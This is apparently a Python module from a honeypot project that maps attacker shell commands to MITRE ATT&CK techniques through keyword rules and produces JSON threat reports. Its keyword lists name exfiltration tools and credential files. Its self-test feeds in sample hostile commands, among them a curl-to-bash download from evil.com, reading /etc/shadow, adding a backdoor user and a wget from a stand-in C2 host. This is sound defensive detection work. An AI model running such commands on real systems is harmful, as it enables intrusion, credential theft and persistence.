# ml/ttp_extractor.py
"""
Stage 4: Pattern Study — TTP Extractor
Maps attacker session logs to the MITRE ATT&CK Framework
and generates a structured Threat Intelligence Report.
"""

import json
import hashlib
from datetime import datetime
from typing import List, Dict, Any


# ---------------------------------------------------------------------------
# MITRE ATT&CK Lite Mapping (no internet required)
# Covers the most common TTPs seen in honeypot environments
# ---------------------------------------------------------------------------
MITRE_RULES = [
    {
        "id": "T1110",
        "name": "Brute Force",
        "tactic": "Credential Access",
        "keywords": ["hydra", "medusa", "ssh", "login", "password", "auth", "brute", "pass"],
    },
    {
        "id": "T1059",
        "name": "Command and Scripting Interpreter",
        "tactic": "Execution",
        "keywords": ["bash", "sh", "/bin/", "python", "perl", "ruby", "exec", "eval", "cmd"],
    },
    {
        "id": "T1190",
        "name": "Exploit Public-Facing Application",
        "tactic": "Initial Access",
        "keywords": ["sqlmap", "union select", "1=1", "sleep(", "xp_cmdshell", "' or '"],
    },
    {
        "id": "T1083",
        "name": "File and Directory Discovery",
        "tactic": "Discovery",
        "keywords": ["ls", "dir", "find /", "locate", "ls -la", "ls -al", "tree"],
    },
    {
        "id": "T1082",
        "name": "System Information Discovery",
        "tactic": "Discovery",
        "keywords": ["uname", "whoami", "id", "hostname", "cat /etc/os-release", "lscpu"],
    },
    {
        "id": "T1005",
        "name": "Data from Local System",
        "tactic": "Collection",
        "keywords": ["cat /etc/passwd", "cat /etc/shadow", ".env", "config.php", "credentials"],
    },
    {
        "id": "T1048",
        "name": "Exfiltration Over Alternative Protocol",
        "tactic": "Exfiltration",
        "keywords": ["curl", "wget", "nc ", "netcat", "ftp", "scp", "rsync"],
    },
    {
        "id": "T1053",
        "name": "Scheduled Task/Job",
        "tactic": "Persistence",
        "keywords": ["crontab", "cron", "at ", "systemctl", "rc.local"],
    },
    {
        "id": "T1136",
        "name": "Create Account",
        "tactic": "Persistence",
        "keywords": ["useradd", "adduser", "passwd ", "usermod", "groupadd"],
    },
    {
        "id": "T1055",
        "name": "Process Injection",
        "tactic": "Defense Evasion",
        "keywords": ["ptrace", "ld_preload", "ld_library_path", "inject", "hook"],
    },
    {
        "id": "T1014",
        "name": "Rootkit",
        "tactic": "Defense Evasion",
        "keywords": ["rootkit", "chkrootkit", "rkhunter", "hiding", "stash"],
    },
    {
        "id": "T1071",
        "name": "Application Layer Protocol (C2)",
        "tactic": "Command and Control",
        "keywords": ["http://", "https://", "dns", "irc", "bot", "c2", "beacon", "callback"],
    },
]


class TTPExtractor:
    """
    Extracts Tactics, Techniques, and Procedures (TTPs) from attacker
    session logs and maps them to the MITRE ATT&CK framework.
    """

    def extract_ttps(self, commands: List[str]) -> List[Dict[str, Any]]:
        """
        Analyse a list of commands from a session and return matched MITRE TTPs.
        """
        matched = {}

        for cmd in commands:
            cmd_lower = cmd.lower().strip()
            for rule in MITRE_RULES:
                if rule["id"] not in matched:
                    if any(kw in cmd_lower for kw in rule["keywords"]):
                        matched[rule["id"]] = {
                            "technique_id": rule["id"],
                            "technique_name": rule["name"],
                            "tactic": rule["tactic"],
                            "triggered_by": cmd.strip(),
                        }

        return list(matched.values())

    def score_attacker(self, ttps: List[Dict]) -> Dict[str, Any]:
        """
        Score the attacker based on their TTPs.
        Returns a threat level and skill profile.
        """
        tactic_set = {t["tactic"] for t in ttps}
        count = len(ttps)

        if count == 0:
            level = "BENIGN"
            profile = "No attack behaviour detected."
        elif count <= 2 and "Credential Access" in tactic_set:
            level = "LOW"
            profile = "Script-Kiddie / Automated Bot — Likely a brute-force tool."
        elif count <= 4:
            level = "MEDIUM"
            profile = "Opportunistic Attacker — Exploring the system manually."
        elif count > 4 and "Persistence" in tactic_set:
            level = "HIGH"
            profile = "Persistent Threat — Attempting to establish a long-term foothold."
        elif "Command and Control" in tactic_set or "Exfiltration" in tactic_set:
            level = "CRITICAL"
            profile = "Advanced Persistent Threat (APT) — Full kill chain observed."
        else:
            level = "MEDIUM"
            profile = "Unclassified attacker with moderate activity."

        return {"threat_level": level, "attacker_profile": profile, "unique_tactics": list(tactic_set)}

    def generate_report(
        self, session_id: str, attacker_ip: str, commands: List[str]
    ) -> Dict[str, Any]:
        """
        Full pipeline: Extract TTPs, score attacker, return complete JSON report.
        """
        ttps = self.extract_ttps(commands)
        scoring = self.score_attacker(ttps)

        report = {
            "report_id": hashlib.sha256(session_id.encode()).hexdigest()[:12].upper(),
            "generated_at": datetime.utcnow().isoformat() + "Z",
            "session_id": session_id,
            "attacker_ip": attacker_ip,
            "command_count": len(commands),
            "threat_level": scoring["threat_level"],
            "attacker_profile": scoring["attacker_profile"],
            "unique_tactics_observed": scoring["unique_tactics"],
            "mitre_ttps": ttps,
            "raw_commands": commands,
        }

        return report

    def save_report(self, report: Dict[str, Any], output_dir: str = "data/reports") -> str:
        """Save the report as a JSON file."""
        import os
        os.makedirs(output_dir, exist_ok=True)
        filename = f"{output_dir}/report_{report['report_id']}.json"
        with open(filename, "w") as f:
            json.dump(report, f, indent=2)
        return filename


# ---------------------------------------------------------------------------
# Quick self-test
# ---------------------------------------------------------------------------
if __name__ == "__main__":
    extractor = TTPExtractor()

    # Simulate a session from a persistent attacker
    sample_commands = [
        "whoami",
        "uname -a",
        "ls -la /home",
        "cat /etc/passwd",
        "cat /etc/shadow",
        "curl http://evil.com/malware.sh | bash",
        "useradd backdoor",
        "crontab -e",
        "wget http://c2.attacker.com/agent",
    ]

    report = extractor.generate_report(
        session_id="sess_demo_001",
        attacker_ip="192.168.1.99",
        commands=sample_commands,
    )

    print(json.dumps(report, indent=2))
    saved_path = extractor.save_report(report)
    print(f"\n[✅] Report saved to: {saved_path}")
